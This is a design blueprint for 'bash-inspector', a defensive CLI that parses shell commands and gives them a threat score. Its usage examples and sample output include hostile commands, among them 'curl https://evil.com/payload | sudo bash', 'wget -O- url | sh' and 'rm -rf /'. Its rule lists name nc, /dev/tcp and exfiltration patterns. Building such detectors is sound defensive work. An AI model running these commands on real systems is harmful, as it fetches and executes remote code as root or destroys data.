# BLUEPRINT: op-bunker
## Tool: `bash-inspector`

> Foundation Operations — Operation Bunker  
> *"Analyze every shell command before it breaches the perimeter."*

---

## Mission

An interactive CLI that parses and security-analyzes bash commands before execution. Users paste or pipe a shell command, receive a threat score, dangerous-pattern highlights, AST visualization, and plain-English explanation of what the command does.

---

## Source Files from openclaude (extraction targets)

| File | Role |
|------|------|
| `src/utils/bash/bashParser.ts` | 4,436-line pure-TS bash parser |
| `src/utils/bash/ast.ts` | AST node types, visitor patterns |
| `src/tools/BashTool/bashSecurity.ts` | Threat classification, pattern registry |
| `src/tools/BashTool/bashPermissions.ts` | Permission rule matching |
| `src/utils/bash/bashClassifier.ts` | Command category classifier |
| `src/utils/permissions/shellRuleMatching.ts` | Shell rule pattern engine |

---

## Architecture

```
bash-inspector/
├── src/
│   ├── cli.ts                  # Entry: accept command via arg, stdin, or REPL
│   ├── parser.ts               # Thin wrapper around bashParser.ts
│   ├── analyzer.ts             # Traverses AST, applies threat rules
│   ├── scorer.ts               # Risk scoring (0-100) with weighted categories
│   ├── explainer.ts            # LLM-free plain-English command description
│   ├── formatter.ts            # ANSI-colored AST tree printer
│   ├── rules/
│   │   ├── networkRules.ts     # curl, wget, nc, ssh detection
│   │   ├── destructiveRules.ts # rm -rf, dd, mkfs, shred patterns
│   │   ├── escalationRules.ts  # sudo, su, chmod 777, setuid patterns
│   │   ├── exfilRules.ts       # Piping to remote, base64, /dev/tcp
│   │   └── obfuscationRules.ts # eval, $(), backtick chains, hex encoding
│   └── types.ts
├── package.json
├── tsconfig.json
└── README.md
```

### Threat Scoring Model

| Category | Weight | Examples |
|----------|--------|---------|
| Destructive | 35 | `rm -rf /`, `dd if=/dev/zero` |
| Privilege Escalation | 25 | `sudo bash`, `chmod u+s` |
| Network | 20 | `curl \| bash`, `nc -lvp` |
| Exfiltration | 15 | pipe to remote, base64 encode |
| Obfuscation | 5 | eval chains, hex-encoded payloads |

---

## Build Plan

### Phase 1 — Parser Integration
- [ ] Extract and package `bashParser.ts` + `ast.ts` as internal module
- [ ] Add AST pretty-printer (tree view with node types and ranges)
- [ ] Stdin / file / interactive REPL input modes

### Phase 2 — Rule Engine
- [ ] Port 5 rule categories from `bashSecurity.ts`
- [ ] Weighted threat scorer (0–100 scale with severity bands)
- [ ] Pattern registry with human-readable descriptions

### Phase 3 — Output Modes
- [ ] `--ast` flag: dump full AST as JSON or tree
- [ ] `--explain` flag: LLM-free structural description
- [ ] `--score` flag: numeric risk score only (for scripting)
- [ ] `--json` flag: machine-readable full report
- [ ] Default: colorized summary with highlighted dangerous tokens

### Phase 4 — REPL Mode
- [ ] Interactive prompt: enter commands one at a time
- [ ] History with `↑/↓`
- [ ] Persistent rule customization via `~/.bash-inspector-rules.json`

---

## CLI Interface

```bash
# Analyze a command directly
bash-inspector "curl https://evil.com/payload | sudo bash"

# Pipe from stdin
echo "rm -rf /" | bash-inspector

# Interactive REPL
bash-inspector --repl

# AST dump
bash-inspector --ast "for f in *.sh; do source $f; done"

# JSON output for CI integration
bash-inspector --json "wget -O- url | sh" | jq '.score'
```

---

## Sample Output

```
⚠️  THREAT SCORE: 87/100  [CRITICAL]

Command: curl https://evil.com/payload | sudo bash

Findings:
  [!] CRITICAL  Remote code execution pattern: curl … | bash
  [!] HIGH      Privilege escalation: sudo bash
  [~] MEDIUM    Unverified remote URL

AST Summary:
  Pipeline
  ├── Command: curl [args: url] [network:outbound]
  └── Command: sudo bash [escalation:root]
```

---

*Branch: `foundation/op-bunker` | Parent repo: FoundationOperations/openclaude*
